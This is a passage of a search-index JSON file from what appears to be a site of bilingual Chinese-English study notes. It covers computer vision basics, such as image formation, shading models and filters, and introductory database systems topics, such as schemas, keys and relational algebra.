Distortion","text":"<p>\u7578\u53d8\uff0c\u7531\u4e8e\u900f\u955c\u7684\u5f62\u72b6\u548c\u4f4d\u7f6e\uff0c\u5bfc\u81f4\u56fe\u50cf\u4e2d\u7684\u7269\u4f53\u5f62\u72b6\u53d1\u751f\u53d8\u5316\u3002\u6bd4\u5982\u4e24\u4e2a\u5e73\u884c\u7ebf\u5728\u56fe\u50cf\u4e2d\u4e0d\u518d\u5e73\u884c\u3002</p> <p>\u8f74\u79fb\u76f8\u673a\uff1a\u900f\u955c\u548c\u4f20\u611f\u5668\u4e0d\u5728\u540c\u4e00\u8f74\u4e0a\uff0c\u6d88\u9664\u7578\u53d8\u3002</p> <p>Radial distortion</p> <p>\u5f84\u5411\u7578\u53d8\uff0c\u7531\u4e8e\u900f\u955c\u7684\u5f62\u72b6\uff0c\u5bfc\u81f4\u56fe\u50cf\u4e2d\u7684\u7269\u4f53\u5f62\u72b6\u53d1\u751f\u53d8\u5316\u3002\u6bd4\u5982\u5706\u5f62\u53d8\u6210\u692d\u5706\u3002\u5206\u4e3a\u6795\u5f62\u7578\u53d8\u548c\u6876\u5f62\u7578\u53d8\u3002</p> <p> </p>"},{"location":"cs/cv/chapter2/#photometric-image-formation","title":"Photometric Image Formation","text":"<p>\u56fe\u50cf\u7684\u4eae\u5ea6\u548c\u989c\u8272\u3002</p>"},{"location":"cs/cv/chapter2/#image-sensor","title":"Image Sensor","text":"<p>\u6bcf\u4e2a pixel \u8bb0\u5f55\u5149\u5f3a\u548c\u989c\u8272\u3002\u4f7f\u7528 CMOS \u4f20\u611f\u5668\u8fdb\u884c\u5149\u7535\u8f6c\u6362\u3002</p>"},{"location":"cs/cv/chapter2/#shutter","title":"Shutter","text":"<p>\u5feb\u95e8\uff0c\u63a7\u5236\u5149\u7ebf\u8fdb\u5165\u4f20\u611f\u5668\u7684\u65f6\u95f4\u3002\u5feb\u95e8\u65f6\u95f4\uff08Shutter speed\uff09\u8d8a\u957f\uff0c\u8fdb\u5165\u7684\u5149\u7ebf\u8d8a\u591a\uff0c\u6210\u50cf\u8d8a\u4eae\u3002</p>"},{"location":"cs/cv/chapter2/#rolling-shutter","title":"Rolling Shutter","text":"<p>\u6eda\u52a8\u5feb\u95e8\uff0c\u9010\u884c\u626b\u63cf\uff0c\u5bfc\u81f4\u5feb\u95e8\u65f6\u95f4\u4e0d\u540c\uff0c\u4ea7\u751f\u56fe\u50cf\u7578\u53d8\u3002</p> <p>\u4e0e\u4e4b\u76f8\u5bf9\u7684\u662f Global Shutter\uff0c\u540c\u65f6\u626b\u63cf\u6240\u6709\u50cf\u7d20\u3002</p>"},{"location":"cs/cv/chapter2/#color-sensing","title":"Color Sensing","text":""},{"location":"cs/cv/chapter2/#hsv-space","title":"HSV Space","text":"<p>Hue\uff08\u8272\u76f8\uff09\u3001Saturation\uff08\u9971\u548c\u5ea6\uff09\u3001Value\uff08\u4eae\u5ea6\uff09\u3002</p>"},{"location":"cs/cv/chapter2/#rgb-space","title":"RGB Space","text":"<p>\u7528 RGB \u8868\u793a\u989c\u8272\u3002\u6bcf\u4e2a pixel \u8bb0\u5f55\u4e09\u4e2a\u901a\u9053\u7684\u5149\u5f3a\u3002</p>"},{"location":"cs/cv/chapter2/#bayer-filter","title":"Bayer Filter","text":"<p>\u8d1d\u5c14\u6ee4\u6ce2\u5668\uff0c\u4f7f\u7528 Bayer Filter \u8fdb\u884c\u989c\u8272\u4f20\u611f\u3002\u6bcf\u4e2a pixel \u53ea\u8bb0\u5f55\u4e00\u4e2a\u901a\u9053\u7684\u5149\u5f3a\uff0c\u901a\u8fc7\u63d2\u503c\u5f97\u5230\u5176\u4ed6\u901a\u9053\u7684\u5149\u5f3a\u3002</p> <p>\u4e24\u4e2a\u7eff\u8272\u901a\u9053\uff1a\u4eba\u773c\u5bf9\u7eff\u8272\u654f\u611f\u3002</p>"},{"location":"cs/cv/chapter2/#shading","title":"Shading","text":"<p>\u7740\u8272\uff0c\u6839\u636e\u5149\u6e90\u3001\u7269\u4f53\u8868\u9762\u3001\u76f8\u673a\u4f4d\u7f6e\u7b49\u56e0\u7d20\uff0c\u8ba1\u7b97\u53cd\u5c04\u5149\u7684\u989c\u8272\u3002</p>"},{"location":"cs/cv/chapter2/#brdf","title":"BRDF","text":"<p>\u53cc\u5411\u53cd\u5c04\u5206\u5e03\u51fd\u6570\uff0c\u63cf\u8ff0\u7269\u4f53\u8868\u9762\u7684\u53cd\u5c04\u7279\u6027\u3002</p>"},{"location":"cs/cv/chapter2/#diffuse-reflection","title":"Diffuse Reflection","text":"<p>\u6f2b\u53cd\u5c04\uff0c\u5149\u7ebf\u5747\u5300\u53cd\u5c04\uff0c\u4e0e\u89c2\u6d4b\u89d2\u5ea6\u65e0\u5173\u3002</p>"},{"location":"cs/cv/chapter2/#specular-reflection","title":"Specular Reflection","text":"<p>\u955c\u9762\u53cd\u5c04\uff0c\u5149\u7ebf\u6309\u7167\u53cd\u5c04\u89d2\u5ea6\u53cd\u5c04\uff0c\u53ea\u4e0e\u89c2\u6d4b\u89d2\u5ea6\u6709\u5173\u3002</p>"},{"location":"cs/cv/chapter2/#ambient-light","title":"Ambient Light","text":"<p>\u73af\u5883\u5149\uff0c\u548c\u7269\u4f53\u8868\u9762\u65e0\u5173\u3002</p> <p>\\(L_a = k_a \\cdot I_a\\)\uff0c\u5176\u4e2d \\(k_a\\) \u4e3a\u73af\u5883\u5149\u7cfb\u6570\uff0c\\(I_a\\) \u4e3a\u73af\u5883\u5149\u5f3a\u5ea6\u3002</p>"},{"location":"cs/cv/chapter2/#blinn-phong-reflection-model","title":"Blinn-Phong Reflection Model","text":"<p>Blinn-Phong \u53cd\u5c04\u6a21\u578b\uff0c\u7ed3\u5408\u6f2b\u53cd\u5c04\u3001\u955c\u9762\u53cd\u5c04\u548c\u73af\u5883\u5149\uff0c\u8fd1\u4f3c\u8868\u793a BRDF\u3002</p> \\[     \\begin{aligned}     L &amp;= L_a + L_d + L_s \\\\     &amp;= k_a I_a + k_d (I / r^2) \\max(0, \\mathbf{n} \\cdot \\mathbf{l}) + k_s (I / r^2) \\max(0, \\mathbf{n} \\cdot \\mathbf{h})^p     \\end{aligned} \\]"},{"location":"cs/cv/chapter3/","title":"\u56fe\u50cf\u7684\u5904\u7406","text":""},{"location":"cs/cv/chapter3/#image-processing-basics","title":"Image processing basics","text":"<ul> <li>Contrast\uff1aS curve\uff0c\\(\\mathrm{output}(x, y) = f(\\mathrm{input}(x, y))\\)</li> <li>Invert\uff1a\\(\\mathrm{output}(x, y) = 1 - \\mathrm{input}(x, y)\\)</li> <li>Blur \u6a21\u7cca</li> <li>Sharpen \u9510\u5316</li> <li>Edge detection \u8fb9\u7f18\u68c0\u6d4b</li> </ul>"},{"location":"cs/cv/chapter3/#gaussian-blur","title":"Gaussian Blur \u9ad8\u65af\u6a21\u7cca","text":"<p>Obtain filter kernel by 2D Gaussian function:</p> \\[     f(i, j) = \\frac{1}{2\\pi\\sigma^2}e^{-\\frac{i^2+j^2}{2\\sigma^2}} \\] <p>3x3 Gaussian kernel:</p> \\[     \\begin{bmatrix}         .075 &amp; .124 &amp; .075 \\\\         .124 &amp; .204 &amp; .124 \\\\         .075 &amp; .124 &amp; .075     \\end{bmatrix} \\]"},{"location":"cs/cv/chapter3/#sharpen-filter","title":"Sharpen Filter \u9510\u5316\u6ee4\u6ce2","text":"\\[     \\begin{bmatrix}         0 &amp; -1 &amp; 0 \\\\         -1 &amp; 5 &amp; -1 \\\\         0 &amp; -1 &amp; 0     \\end{bmatrix} \\] <p>Sharpening is adding high frequencies.</p>"},{"location":"cs/cv/chapter3/#bilateral-filter","title":"Bilateral Filter \u53cc\u8fb9\u6ee4\u6ce2","text":"<p>Kernel depends on both spatial distance and intensity difference.</p>"},{"location":"cs/cv/chapter3/#image-sampling","title":"Image Sampling \u56fe\u50cf\u91c7\u6837","text":"<p>Reducing image size \u2013 down-sampling</p>"},{"location":"cs/cv/chapter3/#aliasing","title":"Aliasing \u6df7\u53e0","text":"<p>\u4ea7\u751f\u539f\u56e0\uff1aSignals are changing too fast but sampled too slow. \u4fe1\u53f7\u53d8\u5316\u592a\u5feb\uff0c\u91c7\u6837\u592a\u6162\u3002</p> <p>Higher frequency signals need faster sampling.</p> <p>Under-sampling\uff1a\u9ad8\u9891\u4fe1\u53f7\u91c7\u6837\u4e0d\u8db3\uff0c\u91c7\u6837\u7ed3\u679c\u9519\u8bef\u5730\u663e\u793a\u4f4e\u9891\u4fe1\u53f7\u3002</p>"},{"location":"cs/cv/chapter3/#fourier-transform","title":"Fourier Transform \u5085\u91cc\u53f6\u53d8\u6362","text":"<p>Represent a function as a weighted sum of sines and cosines. \u5c06\u51fd\u6570\u8868\u793a\u4e3a\u6b63\u5f26\u548c\u4f59\u5f26\u7684\u52a0\u6743\u548c\u3002</p> \\[     F(u) = \\int_{-\\infty}^{\\infty} f(x)e^{-2\\pi i ux}\\mathrm{d}x \\]"},{"location":"cs/database/","title":"\u6570\u636e\u5e93\u7cfb\u7edf","text":"<p>Info</p> <p>\u672c\u6587\u6863\u4e3a\u6570\u636e\u5e93\u7cfb\u7edf\u7684\u5b66\u4e60\u7b14\u8bb0\uff0c\u6388\u8bfe\u6559\u5e08\u4e3a \u9648\u521a \u3002</p>"},{"location":"cs/database/chapter1/","title":"Introduction","text":"<p>What is a database?</p> <ul> <li>Database: A very large, integrated collection of data. \u6570\u636e\u96c6\u5408\u3002</li> <li> <p>Database Management System (DBMS): A software system designed to store, manage, and facilitate access to databases. \u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u3002</p> <p>DBMS = ( Database ) + A set of programs used to access, update and manage the data in database. </p> </li> </ul>"},{"location":"cs/database/chapter1/#purpose-of-database-systems","title":"Purpose of Database Systems","text":""},{"location":"cs/database/chapter1/#database-applications","title":"Database Applications","text":"<p>Data processing and management. \u4e3b\u8981\u7528\u4e8e\u6570\u636e\u5904\u7406\u548c\u7ba1\u7406\u3002</p>"},{"location":"cs/database/chapter1/#dbms-vs-file-processing-systems","title":"DBMS vs. File-processing Systems","text":"<ul> <li> <p>DBMS:</p> <ol> <li>Efficiency and scalability in data access. \u6570\u636e\u8bbf\u95ee\u6548\u7387\u9ad8\uff0c\u53ef\u6269\u5c55\u6027\u5f3a\u3002</li> <li>Reduced application development time. \u7f29\u77ed\u5e94\u7528\u5f00\u53d1\u65f6\u95f4\u3002</li> <li>Data independence. \u6570\u636e\u72ec\u7acb\u6027\u3002</li> <li>Data integrity and security. \u6570\u636e\u5b8c\u6574\u6027\u548c\u5b89\u5168\u6027\u3002</li> <li>Concurrent access and robustness. \u5e76\u53d1\u8bbf\u95ee\u548c\u6570\u636e\u5065\u58ee\u6027\uff08\u53ef\u9760\u6027\uff09\u3002</li> </ol> </li> <li> <p>File-processing Systems:</p> <ol> <li>Data redundancy and inconsistency. \u6570\u636e\u5197\u4f59\u548c\u4e0d\u4e00\u81f4\u3002\u53ef\u80fd\u5b58\u5728\u540c\u4e00\u6570\u636e\u7684\u591a\u4e2a\u526f\u672c\uff0c\u4e14\u8fd9\u4e9b\u526f\u672c\u53ef\u80fd\u4e0d\u540c\u6b65\u3002</li> <li>Difficulty in accessing data. \u6570\u636e\u8bbf\u95ee\u56f0\u96be\u3002\u8bbf\u95ee\u6570\u636e\u9700\u8981\u7f16\u5199\u4e13\u95e8\u7684\u7a0b\u5e8f\u3002</li> <li>Data isolation. \u6570\u636e\u9694\u79bb\u3002\u96be\u4ee5\u68c0\u7d22\u548c\u5171\u4eab\u6570\u636e\u3002</li> <li>Integrity problems. \u5b8c\u6574\u6027\u95ee\u9898\u3002\u96be\u4ee5\u6dfb\u52a0\u65b0\u7684\u7ea6\u675f\u6216\u8005\u66f4\u6539\u5df2\u6709\u7684\u7ea6\u675f\u3002</li> <li>Atomicity problems. \u539f\u5b50\u6027\u95ee\u9898\u3002\u6570\u636e\u8bbf\u95ee\u5931\u8d25\u53ef\u80fd\u4f1a\u5bfc\u81f4\u6574\u4f53\u6570\u636e\u4e0d\u540c\u6b65\u3002</li> <li>Concurrent access anomalies. \u5e76\u53d1\u8bbf\u95ee\u5f02\u5e38\u3002</li> <li>Security problems. \u5b89\u5168\u6027\u95ee\u9898\u3002</li> </ol> </li> </ul>"},{"location":"cs/database/chapter1/#view-of-data","title":"View of Data","text":""},{"location":"cs/database/chapter1/#levels-of-data-abstraction","title":"Levels of Data Abstraction","text":"<ul> <li>Physical level: describes how a record is stored. \u6570\u636e\u7684\u7269\u7406\u5b58\u50a8\u65b9\u5f0f</li> <li>Logical level: describes data stored in database, and the relationships among the data on upper level. \u63cf\u8ff0\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\uff0c\u548c\u6570\u636e\u4e4b\u95f4\u7684\u5173\u7cfb\u3002</li> <li>View level: application programs hide details of data types. Note that views can also hide information (e.g., employee\u2019s salary) for security purposes. \u9009\u62e9\u6027\u5411\u7528\u6237\u5c55\u793a\u6570\u636e\u3002</li> </ul>"},{"location":"cs/database/chapter1/#schemas-and-instances","title":"Schemas and Instances","text":"<ul> <li> <p>Schemas \u67b6\u6784: the structure of the database on different levels. \u6570\u636e\u5e93\u7684\u7ed3\u6784\u3002</p> <ol> <li>Physical schema: database structure design at the physical level.</li> <li>Logical schema: database structure design at the logical level.</li> <li>Subschema: schema at view level.</li> </ol> </li> <li> <p>Instances \u5b9e\u4f8b: the actual content of the database at a particular point in time. \u6570\u636e\u5e93\u7684\u5b9e\u9645\u5185\u5bb9\u3002</p> </li> </ul> <p>\u7c7b\u6bd4</p> <ul> <li>Schema: \u7c7b\u6bd4\u4e3a\u6570\u636e\u7c7b\u578b\uff08type\uff09\u3002</li> <li>Instance: \u7c7b\u6bd4\u4e3a\u5b9e\u4f8b\u5316\u540e\u7684\u53d8\u91cf\uff08variable\uff09\u3002</li> </ul>"},{"location":"cs/database/chapter1/#independence","title":"Independence","text":"<p>Ability to modify a schema definition at one level without affecting a schema definition at a higher level. \u5728\u4e0d\u5f71\u54cd\u66f4\u9ad8\u5c42\u6b21\u7684\u6570\u636e\u7684\u60c5\u51b5\u4e0b\u4fee\u6539\u5e95\u5c42\u6570\u636e\u3002</p> <ul> <li>Physical Data Independence: the ability to modify the physical schema without changing the logical schema. \u53ef\u4ee5\u4fee\u6539\u7269\u7406\u67b6\u6784\u800c\u4e0d\u5f71\u54cd\u903b\u8f91\u67b6\u6784\u3002DBMS \u7684\u4e3b\u8981\u4f18\u52bf</li> <li>Logical Data Independence: protection from changes in the logical schema. \u4fdd\u62a4\u903b\u8f91\u67b6\u6784\u4e0d\u53d7\u5e94\u7528\u7a0b\u5e8f\u7684\u5f71\u54cd\u3002\u6bd4\u8f83\u96be\u4ee5\u5b9e\u73b0\uff0c\u56e0\u4e3a\u5927\u90e8\u5206\u5e94\u7528\u7a0b\u5e8f\u90fd\u4f9d\u8d56\u4e8e\u903b\u8f91\u67b6\u6784\u3002</li> </ul>"},{"location":"cs/database/chapter1/#data-models","title":"Data Models","text":"<p>A collection of conceptual tools for describing data, data relationships, data semantics, and consistency constraints. \u63cf\u8ff0\u6570\u636e\u3001\u6570\u636e\u5173\u7cfb\u3001\u6570\u636e\u8bed\u4e49\u548c\u4e00\u81f4\u6027\u7ea6\u675f\u7684\u6982\u5ff5\u5de5\u5177\u96c6\u5408\u3002</p> <ul> <li>Entity-Relationship model \u5b9e\u4f53\u5173\u7cfb\u6a21\u578b: \u63cf\u8ff0\u5b9e\u4f53\u7684\u5c5e\u6027\u548c\u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u3002</li> <li>Relational model \u5173\u7cfb\u6a21\u578b: \u63cf\u8ff0\u6570\u636e\u7684\u903b\u8f91\u7ed3\u6784\u3002</li> <li>Others: Object-oriented, Semi-structured data models(XML), etc.</li> </ul> <p>Database design step</p> <ul> <li>Requirements analysis</li> <li>Conceptual design: \u4f7f\u7528 ER \u6a21\u578b</li> <li>Logical design: \u4f7f\u7528\u5173\u7cfb\u6a21\u578b</li> <li>...</li> </ul>"},{"location":"cs/database/chapter1/#database-language","title":"Database Language","text":"<ul> <li>Data Definition Language (DDL): Specification notation for defining the database schema. \u7528\u4e8e\u5b9a\u4e49\u6570\u636e\u5e93\u67b6\u6784\u7684\u89c4\u8303\u7b26\u53f7\u3002</li> <li>Data Manipulation Language (DML): Language for accessing and manipulating the data organized by appropriate data model. \u7528\u4e8e\u8bbf\u95ee\u548c\u64cd\u4f5c\u6570\u636e\u7684\u8bed\u8a00\u3002</li> <li>Data Control Language (DCL)</li> </ul>"},{"location":"cs/database/chapter1/#ddl","title":"DDL","text":"<p>Specify a database schema by a set of definitions expressed by a data-definition language (DDL). The DDL is also used to specify additional properties of the data. DDL \u7528\u4e8e\u5b9a\u4e49\u5173\u7cfb\u6a21\u5f0f\u3001\u5220\u9664\u5173\u7cfb\u3001\u4fee\u6539\u5173\u7cfb\u6a21\u5f0f\u4ee5\u53ca\u521b\u5efa\u6570\u636e\u5e93\u4e2d\u7684\u5404\u79cd\u5bf9\u8c61\u3002</p> <p>DDL \u7f16\u8bd1\u540e\u751f\u6210\u4e00\u5f20\u5305\u542b\u5143\u6570\u636e\uff08metadata\uff09\u7684\u8868\uff0c\u79f0\u4f5c data dictionary\u3002</p>"},{"location":"cs/database/chapter1/#dml","title":"DML","text":"<p>\u7528\u4e8e\u64cd\u7eb5\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e\uff0c\u5176\u4e2d\u6d89\u53ca\u6570\u636e\u67e5\u8be2\u5230\u90e8\u5206\u79f0\u4e3a\u67e5\u8be2\u8bed\u8a00\uff08query language\uff09\u3002</p> <p>Two classes of DMLs:</p> <ul> <li>Procedural DMLs \u8fc7\u7a0b\u5f0f: \u7528\u6237\u9700\u8981\u6307\u5b9a\u5982\u4f55\u83b7\u53d6\u6570\u636e\u3002\u4f8b\u5982 C\u3001Java \u7b49\u8bed\u8a00\u3002</li> <li>Nonprocedural DMLs \u975e\u8fc7\u7a0b\u5f0f\uff08\u9648\u8ff0\u5f0f\uff09: \u7528\u6237\u53ea\u9700\u8981\u6307\u5b9a\u9700\u8981\u83b7\u53d6\u7684\u6570\u636e\u3002\u4f8b\u5982 SQL\u3002</li> </ul>"},{"location":"cs/database/chapter1/#sql","title":"SQL","text":"<p>SQL = DDL + DML + DCL</p>"},{"location":"cs/database/chapter1/#database-design","title":"Database Design","text":"<ul> <li>Requirement Analysis: What data, applications, and operations needed.</li> <li>Conceptual Design: High-level description of data to be stored, using ER model. \u9ad8\u5c42\u6b21\u63cf\u8ff0\u6570\u636e\u7684\u5b58\u50a8\uff0c\u4f7f\u7528 ER \u6a21\u578b\u3002</li> <li>Logical Design: Translate ER model to DB schema. \u5c06 ER \u6a21\u578b\u8f6c\u6362\u4e3a\u6570\u636e\u5e93\u67b6\u6784\u3002</li> <li>Schema Refinement: Improve the logical schema. \u6539\u8fdb\u903b\u8f91\u67b6\u6784\u3002</li> <li>Physical Database Design: Design the internal storage structure. \u8bbe\u8ba1\u5185\u90e8\u5b58\u50a8\u7ed3\u6784\u3002</li> <li>Creating and Initializing the Database: \u521b\u5efa\u548c\u521d\u59cb\u5316\u6570\u636e\u5e93\u3002</li> </ul>"},{"location":"cs/database/chapter1/#e-r-model","title":"E-R Model","text":"<p>ER Model of Real World: - Entities: Entities are described by a set of attributes. \u5b9e\u4f53\u7531\u4e00\u7ec4\u5c5e\u6027\u63cf\u8ff0\u3002 - Relationships: Relationships among entities. \u5b9e\u4f53\u4e4b\u95f4\u7684\u5173\u7cfb\u3002</p> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter1/#relational-model","title":"Relational Model","text":"<p>Transfer E-R diagrams into relational schema.</p> <p>\u8f6c\u6362\u540e\u7684\u8868\u683c\u7b2c\u4e00\u884c\u4e3a\u5b9e\u4f53\u7684\u5c5e\u6027\uff0c\u968f\u540e\u6bcf\u4e00\u884c\u4e3a\u4e00\u4e2a\u5143\u7ec4\uff0c\u4ee3\u8868\u4e00\u4e2a\u5b9e\u4f8b\u3002</p> <p>Example</p> <p>\u5c06 customer \u5b9e\u4f53\u8f6c\u6362\u4e3a\u5173\u7cfb\u6a21\u578b\uff1a</p> <p> </p>"},{"location":"cs/database/chapter1/#database-users-and-administrators","title":"Database Users and Administrators","text":""},{"location":"cs/database/chapter1/#users","title":"Users","text":"<p>\u7531\u5176\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u7684\u65b9\u5f0f\u8fdb\u884c\u5212\u5206\uff1a</p> <ul> <li>Naive users: \u8c03\u7528\u9884\u5b9a\u4e49\u7684\u7a0b\u5e8f\u8bbf\u95ee\u6570\u636e\u5e93\uff0c\u666e\u901a\u7528\u6237\u3002</li> <li>Application programmers: \u5f00\u53d1\u5e94\u7528\u7a0b\u5e8f\u7684\u7a0b\u5e8f\u5458\uff0c\u901a\u8fc7 SQL calls \u8bbf\u95ee\u6570\u636e\u5e93\u3002</li> <li>Sophisticated users: \u901a\u8fc7 SQL \u67e5\u8be2\u6570\u636e\u5e93\u3002</li> <li>Specialized users: write specialized database applications that do not fit into the traditional data processing framework. \u7f16\u5199\u4e13\u95e8\u7684\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f\u3002</li> </ul>"},{"location":"cs/database/chapter1/#transaction-management","title":"Transaction Management","text":"<p>A transaction is a collection of operations that performs a single logical function in a database application. \u4e8b\u52a1\u662f\u6570\u636e\u5e93\u5e94\u7528\u7a0b\u5e8f\u4e2d\u6267\u884c\u5355\u4e2a\u903b\u8f91\u529f\u80fd\u7684\u4e00\u7ec4\u64cd\u4f5c\u3002</p> <p>Transaction requirements include atomicity, consistence, isolation, durability. \u4e8b\u52a1\u8981\u6c42\u5305\u62ec\u539f\u5b50\u6027\u3001\u4e00\u81f4\u6027\u3001\u9694\u79bb\u6027\u3001\u6301\u4e45\u6027\u3002</p>"},{"location":"cs/database/chapter1/#database-architecture","title":"Database Architecture","text":""},{"location":"cs/database/chapter1/#storage-manager","title":"Storage Manager","text":"<p>\u4e3a\u5e94\u7528\u7a0b\u5e8f\u63d0\u4f9b\u8bbf\u95ee\u5e95\u5c42\u6570\u636e\u7684\u63a5\u53e3\u3002\u5206\u4e3a\uff1a</p> <ul> <li>Transaction manager: \u4e8b\u52a1\u7ba1\u7406\u3002</li> <li>Authorization and integrity manger: \u6388\u6743\u548c\u5b8c\u6574\u6027\u7ba1\u7406\u3002</li> <li>File manager: interaction with the file system to process data files, data dictionary, and index files. \u4e0e\u6587\u4ef6\u7cfb\u7edf\u4ea4\u4e92\u5904\u7406\u6570\u636e\u6587\u4ef6\u3001\u6570\u636e\u5b57\u5178\u548c\u7d22\u5f15\u6587\u4ef6\u3002</li> <li>Buffer manager: \u6570\u636e\u7f13\u5b58\u7ba1\u7406\u3002</li> </ul>"},{"location":"cs/database/chapter1/#query-processor","title":"Query Processor","text":"<p>Query Processor includes DDL interpreter, DML compiler, and query processing. \u67e5\u8be2\u5904\u7406\u5668\u5305\u62ec DDL \u89e3\u91ca\u5668\u3001DML \u7f16\u8bd1\u5668\u548c\u67e5\u8be2\u5904\u7406\u3002</p>"},{"location":"cs/database/chapter1/#database-system-internals","title":"Database System Internals","text":""},{"location":"cs/database/chapter2/","title":"Relational Model","text":"<p>A relational database is a collection of one or more relations, which are based on the relational model.</p> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#structure-of-relational-databases","title":"Structure of Relational Databases","text":""},{"location":"cs/database/chapter2/#basic-structure","title":"Basic Structure","text":"<p>\u8bbe\u96c6\u5408 \\( D_1, D_2, \\ldots, D_n \\)\uff0c\u5173\u7cfb \\(r\\) \u662f\u7b1b\u5361\u5c14\u79ef \\(D_1 \\times D_2 \\times \\ldots \\times D_n\\) \u7684\u4e00\u4e2a\u5b50\u96c6\u3002</p>"},{"location":"cs/database/chapter2/#attribute-types","title":"Attribute Types","text":"<p>\u8bbe\u5173\u7cfb \\(r\\) \u4e3a\u5143\u7ec4 \\( (a_1, a_2, \\ldots, a_n) \\)\uff0c\u5176\u4e2d \\(a_i\\) \u662f\u5c5e\u6027\uff0c\\(D_i\\) \u662f\u5c5e\u6027\u7684\u57df\u3002\u6bcf\u4e2a\u5c5e\u6027\u90fd\u6709\u540d\u79f0\u3002</p> <p>\u5173\u7cfb\u7406\u8bba\u7b2c\u4e00\u8303\u5f0f</p> <p>Attribute values are (normally) required to be atomic. \u5c5e\u6027\u503c\u662f\u539f\u5b50\u7684\uff0c\u5373\u65e0\u6cd5\u5206\u5272\u3002\u4f8b\u5982\u590d\u5408\u5c5e\u6027\u6216\u8005\u591a\u503c\u5c5e\u6027\u90fd\u4e0d\u80fd\u6210\u4e3a\u5173\u7cfb\u7684\u5c5e\u6027\u3002</p> <p>\\( \\mathsf{null} \\) \u5c5e\u4e8e\u6bcf\u4e2a\u57df\u3002</p>"},{"location":"cs/database/chapter2/#concepts-about-relation","title":"Concepts about Relation","text":"<p>A relation is concerned with two concepts: relation schema and  relation instance. \u5173\u7cfb\u5305\u542b\u4e24\u4e2a\u6982\u5ff5\uff1a\u5173\u7cfb\u6a21\u5f0f\u548c\u5173\u7cfb\u5b9e\u4f8b\u3002</p> <ul> <li> <p>Relation Schema: describes the structure of the relation.</p> <p>Example</p> <pre><code>Student_schema = (sid: string, name: string, sex: string, age: int, dept: string)\n</code></pre> <p>or</p> <pre><code>Student_schema = (sid, name, sex, age, dept)\n</code></pre> </li> <li> <p>Relation Instance: corresponds to the snapshot of the data in the relation at a given instant in time.</p> </li> </ul>"},{"location":"cs/database/chapter2/#the-properties-of-relation","title":"The Properties of Relation","text":"<ul> <li>The order of tuples is irrelevant. \u65e0\u5e8f</li> <li>No duplicated tuples in a relation. \u65e0\u91cd\u590d</li> <li>Attribute values are atomic. \u5c5e\u6027\u662f\u539f\u5b50\u7684</li> </ul>"},{"location":"cs/database/chapter2/#database","title":"Database","text":"<p>A database consists of a collection of relations.</p>"},{"location":"cs/database/chapter2/#key","title":"Key","text":"<p>\\(K \\subseteq R\\)</p> <ul> <li>Superkey: \\(K\\) is a superkey of \\(R\\) if the values of \\(K\\) are sufficient to identify a unique tuple in \\(R\\). \\(K\\) \u662f \\(R\\) \u7684\u8d85\u952e\uff0c\u5982\u679c \\(K\\) \u7684\u503c\u8db3\u4ee5\u552f\u4e00\u6807\u8bc6 \\(R\\) \u4e2d\u7684\u4e00\u4e2a\u5143\u7ec4\u3002</li> <li>Candidate Key: \\(K\\) is a candidate key of \\(R\\) if \\(K\\) is a minimal superkey of \\(R\\). \\(K\\) \u662f \\(R\\) \u7684\u5019\u9009\u952e\uff0c\u5982\u679c \\(K\\) \u662f \\(R\\) \u7684\u6700\u5c0f\u8d85\u952e\u3002</li> <li>Primary Key: A candidate key defined by the database designer. \u4e3b\u952e\u662f\u6570\u636e\u5e93\u8bbe\u8ba1\u8005\u5b9a\u4e49\u7684\u5019\u9009\u952e\uff0c\u901a\u5e38\u7528\u4e0b\u5212\u7ebf\u6807\u8bc6\u3002</li> </ul>"},{"location":"cs/database/chapter2/#foreign-key","title":"Foreign Key","text":"<p>Assume relations \\(r\\) and \\(s\\): \\(r(\\underline{A}, B, C)\\), \\(s(\\underline{B}, D)\\). \\(B\\) in relation \\(r\\) is a foreign key referencing \\(s\\), and \\(r\\) is a referencing relation, and \\(s\\) is a referenced relation.</p> <p>\u53c2\u7167\u5173\u7cfb\u4e2d\u5916\u7801\u7684\u503c\u5fc5\u987b\u5728\u88ab\u53c2\u7167\u5173\u7cfb\u4e2d\u5b9e\u9645\u5b58\u5728, \u6216\u4e3a \\( \\mathsf{null} \\)\u3002</p>"},{"location":"cs/database/chapter2/#query-language","title":"Query Language","text":"<p>Pure languages:</p> <ul> <li>Relational Algebra: a procedural query language. \u8fc7\u7a0b\u5f0f\u67e5\u8be2\u8bed\u8a00\uff0cSQL \u7684\u57fa\u7840\u3002</li> <li>Tuple Relational Calculus: \u5143\u7ec4\u5173\u7cfb\u6f14\u7b97</li> <li>Domain Relational Calculus: \u57df\u5173\u7cfb\u6f14\u7b97</li> </ul>"},{"location":"cs/database/chapter2/#fundamental-relational-algebra-operations","title":"Fundamental Relational-Algebra Operations","text":"<p>Six basic operators:</p> <ul> <li>Selection: \\( \\sigma \\) \u9009\u62e9</li> <li>Projection: \\( \\Pi \\) \u6295\u5f71</li> <li>Union: \\( \\cup \\) \u5e76</li> <li>Set Difference: \\( - \\) \u5dee</li> <li>Cartesian product: \\( \\times \\) \u7b1b\u5361\u5c14\u79ef</li> <li>Rename: \\( \\rho \\) \u91cd\u547d\u540d</li> </ul>"},{"location":"cs/database/chapter2/#selection","title":"Selection","text":"<p>\\( \\sigma_{p} (r) = \\{ t \\mid t \\in r \\land p(t) \\} \\)</p> <ul> <li>\\( r \\) is a relation</li> <li>\\( p \\) is a predicate in the form of <code>&lt;attribute&gt; op &lt;attribute&gt; or &lt;constant&gt;</code>, where <code>op</code> is a comparison operator.</li> </ul> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#projection","title":"Projection","text":"<p>\\( \\Pi_{A_1, A_2, \\ldots, A_k} (r) \\)</p> <ul> <li>\\( r \\) is a relation</li> <li>\\( A_i \\) is an attribute of \\( r \\)</li> </ul> <p>The result is defined as the relation of \\(k\\) columns obtained by erasing the columns that are not listed. \u7ed3\u679c\u662f\u901a\u8fc7\u5220\u9664\u672a\u5217\u51fa\u7684\u5217\u800c\u83b7\u5f97\u7684 \\(k\\) \u5217\u5173\u7cfb\u3002\u5e76\u4e14\u8fdb\u884c \u53bb\u91cd\u3002</p> <p>Example</p> <p> </p>"},{"location":"cs/database/chapter2/#union","title":"Union","text":"<p>\\( r \\cup s = \\{ t \\mid t 